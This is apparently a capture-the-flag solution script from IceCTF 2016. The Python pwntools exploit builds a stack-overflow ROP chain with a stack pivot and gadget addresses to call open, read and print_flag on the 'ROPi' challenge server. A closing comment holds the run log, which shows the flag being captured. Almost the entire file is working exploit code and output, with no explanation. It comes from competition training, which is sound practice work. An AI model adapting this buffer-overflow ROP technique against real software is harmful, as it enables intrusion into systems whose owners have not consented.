#!/usr/bin/env python

from pwn import *
import time

open_ = pack(0x08048569)
read_plt = pack(0x080483b0)
read_ = pack(0x080485c4)
exit_ = pack(0x80485e8)
print_flag = pack(0x0804862c)
size_t = pack(0x120)
pop_ebp_ret = pack(0x080486ef)
pop_edi_ebp_ret = pack(0x080486ee)
leave_ret = pack(0x08048498)
overwrite_ebp = pack(0x804a6ac - 3)
destination = pack(0x804a6ac)
second_ebp = pack(0x804a6ac + 4)
stack_pivot = pack(0x804a6ad)

payload = 'X' * 40 + overwrite_ebp + read_plt + leave_ret + pack(0x00000000) + stack_pivot + size_t

#p = process('./ropi')
p = remote('ropi.vuln.icec.tf', 6500)
#print(util.proc.pidof(p))
#e = raw_input()
p.sendline(payload + pop_ebp_ret + destination + open_ + pop_edi_ebp_ret + pack(0xbadbeeef) \
                                                        + second_ebp + read_ + print_flag + exit_ + pack(0x78563412))

print(p.recvall())

"""
[christrc@kali ~/Dr/P/co/ch/CT/2016/I/Wa/ROPi]$ ./game.py
[+] Opening connection to ropi.vuln.icec.tf on port 6500: Done
[]

[+] Recieving all data: Done (150B)
[*] Closed connection to ropi.vuln.icec.tf port 6500
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] aperto
[+] leggi
[+] stampare
IceCTF{italiano_ha_portato_a_voi_da_google_tradurre}
